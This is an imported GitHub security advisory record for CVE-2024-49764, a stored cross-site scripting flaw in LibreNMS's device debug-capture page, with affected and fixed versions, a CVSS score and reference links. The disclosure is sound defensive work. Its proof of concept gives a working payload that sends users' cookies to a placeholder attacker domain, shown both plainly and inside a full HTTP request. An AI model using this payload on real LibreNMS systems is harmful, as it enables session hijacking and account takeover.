advisory_id: GHSA-rmr4-x6c9-jc68
datasource_id: github_osv_importer_v2/GHSA-rmr4-x6c9-jc68
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-rmr4-x6c9-jc68/GHSA-rmr4-x6c9-jc68.json
aliases:
  - CVE-2024-49764
summary: |
  LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device/capture.inc.php
  ### Summary
  A Stored Cross-Site Scripting (XSS) vulnerability in the "Capture Debug Information" page allows authenticated users to inject arbitrary JavaScript through the "hostname" parameter when creating a new device. This vulnerability results in the execution of malicious code when the "Capture Debug Information" page is visited, redirecting the user and sending non-httponly cookies to an attacker-controlled domain.

  ### Details
  When creating a new device, an attacker can inject the following XSS payload into the "hostname" parameter:

  ```
  test'" autofocus onfocus="document.location='https://<attacker_domain>/logger.php?c='+document.cookie"
  ```

  (Note: You may need to URL-encode the '+' sign in the payload.)

  The payload triggers automatically when visiting the "Capture Debug Information" page for the device, redirecting the user's browser to the attacker-controlled domain along with any non-httponly cookies.

  The vulnerability is due to insufficient sanitization of the "url" variable before it is output in the HTML. This is evident in the following lines of code:

  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/capture.inc.php#L55

  ### PoC
  1. Create a new device with the following payload in the "hostname" parameter:
  ```
  test'" autofocus onfocus="document.location='https://<attacker_domain>/logger.php?c='+document.cookie"
  ```
  2. Save the device.
  3. Navigate to the "Capture Debug Information" page for the device.
  4. Observe that the injected script triggers and redirects the user to the attacker's domain, sending cookies.

  Example Request:
  ```http
  POST /addhost HTTP/1.1
  Host: <your_host>
  Content-Type: application/x-www-form-urlencoded
  Cookie: <your_cookie>

  _token=<your_token>&hostname=test%27%22+autofocus+onfocus%3D%22document.location%3D%27https%3A%2F%2F<attacker_domain>%2Flogger.php%3Fc%3D%27%2bdocument.cookie%22&snmp=on&sysName=&hardware=&os=&os_id=&snmpver=v2c&port=&transport=udp&port_assoc_mode=ifIndex&community=&authlevel=noAuthNoPriv&authname=&authpass=&authalgo=SHA&cryptopass=&cryptoalgo=AES&force_add=on&Submit=
  ```

  ### Impact

  This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the "Capture Debug Information" page of the device. The attacker can redirect the user to a malicious domain and capture non-httponly cookies, potentially compromising the user's account and allowing unauthorized actions.
impacted_packages:
  - purl: pkg:composer/librenms/librenms
    affected_versions: vers:composer/<=24.9.1
    fixed_versions: vers:composer/24.10.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-rmr4-x6c9-jc68/GHSA-rmr4-x6c9-jc68.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/af15eabbb1752985d36f337cecf137a947e170f6
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-49764
    reference_type:
    reference_id: CVE-2024-49764
